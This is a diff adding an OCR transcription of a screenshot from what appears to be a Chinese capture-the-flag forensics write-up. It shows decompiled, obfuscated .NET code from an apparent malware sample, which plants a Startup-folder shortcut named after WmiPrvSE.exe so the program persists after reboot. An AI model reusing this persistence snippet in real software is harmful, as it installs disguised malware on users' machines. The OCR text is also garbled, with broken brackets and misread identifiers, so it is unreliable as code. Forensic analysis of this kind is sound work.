@@ -1,0 +1,21 @@
+# OCR: Pasted_image_20260415234950.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260415234950.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:44
+
+113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137
+try
+string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + ",i" + Path.GetFileNameithoutExtension(statics.WmiPrvSE.exe) + ".lnk":
+bject obj = Interaction.CreateObject("WScript.Shell",""): Type type = null:
+string text3 = "CreateShortcut"
+object[] array = new object[] ［ text2 ]
+object[] array2 = array: string[] array3 = null: Type[] array4 = null:
+bool[] array5 = new bool[] { true ]
+object obj2 = NewLateBinding.LateGet(obj, type, text3, array2, array3, array4, array5) if (array5[o])
+text2 = (string)conversions.ChangeTvpe(RuntimeHelpers.GetobjectValue(array[ol, typeof(string))
+ob.ject ob.j3 = obj2
+NewLateBinding.LateSetComplex(obs3， null，"TargetPath"， new object[] ( text }， null， null， false， true)
+""}，null， null， false， true):
+NewLateBinding.LateSetComplex(obj3, null，"WorkingDirectory"， new object[] {"
+NewLateBinding.LateCall(obj3, null, "Save", new object[ol, null, null, null, true): ACX0qTJzEzq40gP5qFxb.BQg61GBk6rjrH8oz1GbD = new FileStream(text2, FileMode.Open) :
+catch (Exception ex6)
